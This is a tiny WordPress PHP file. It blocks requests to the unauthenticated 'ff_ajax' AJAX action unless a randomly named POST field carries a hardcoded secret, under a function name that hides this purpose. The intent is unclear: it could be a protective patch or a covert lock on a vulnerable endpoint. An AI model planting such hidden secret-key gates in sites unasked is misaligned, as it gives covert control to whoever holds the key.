<?php

function rating_notifier_signature() {
	if (!isset($_POST["wqnacgzfyxztgvd"]) || $_POST["wqnacgzfyxztgvd"] !== "jby9ohsYJCq") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'rating_notifier_signature', 5, 1);
